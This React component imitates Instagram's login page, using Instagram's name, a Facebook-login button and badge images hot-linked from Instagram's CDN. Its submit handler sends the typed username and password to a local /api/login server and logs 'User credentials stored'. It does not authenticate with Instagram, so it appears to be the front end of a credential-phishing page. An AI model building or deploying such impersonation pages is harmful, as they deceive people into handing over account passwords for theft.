import React, { useState } from 'react';
import './InstagramLogin.css';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch('http://localhost:3000/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          password
        }),
      });

      const data = await response.json();

      if (response.ok) {
        setMessage('Login successful!');
        // Clear form after successful submission
        setUsername('');
        setPassword('');
        console.log('User credentials stored:', data);
      } else {
        setMessage(data.error || 'Login failed');
      }
    } catch (error) {
      console.error('Error:', error);
      setMessage('Network error occurred');
    }

    setLoading(false);
  };

  return (
    <div className="instagram-container">
    
      
      <div className="form-container">
        <div className="login-box">
          <div className="instagram-logo">
            <h1 className="logo-text">Instagram</h1>
          </div>
          
          <form onSubmit={handleSubmit} className="login-form">
            <div className="input-group">
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                className="form-input"
              />
            </div>
            
            <div className="input-group">
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="form-input"
              />
            </div>
            
            <button 
              type="submit" 
              disabled={loading || !username || !password}
              className={`login-button ${(!username || !password) ? 'disabled' : ''}`}
            >
              {loading ? 'Logging in...' : 'Log in'}
            </button>
            
            {message && (
              <div className={`message ${message.includes('successful') ? 'success' : 'error'}`}>
                {message}
              </div>
            )}
          </form>
          
          <div className="divider">
            <div className="divider-line"></div>
            <span className="divider-text">OR</span>
            <div className="divider-line"></div>
          </div>
          
          <button className="facebook-login">
            <svg className="facebook-icon" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            Log in with Facebook
          </button>
          
          <a href="#" className="forgot-password">Forgot password?</a>
        </div>
        
        <div className="signup-box">
          <p>Don't have an account? <a href="#" className="signup-link">Sign up</a></p>
        </div>
        
        <div className="app-download">
          <p>Get the app.</p>
          <div className="download-buttons">
            <a href="#" className="download-button">
              <img 
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" 
                alt="Download on the App Store"
                className="app-store-badge"
              />
            </a>
            <a href="#" className="download-button">
              <img 
                src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" 
                alt="Get it on Google Play"
                className="google-play-badge"
              />
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;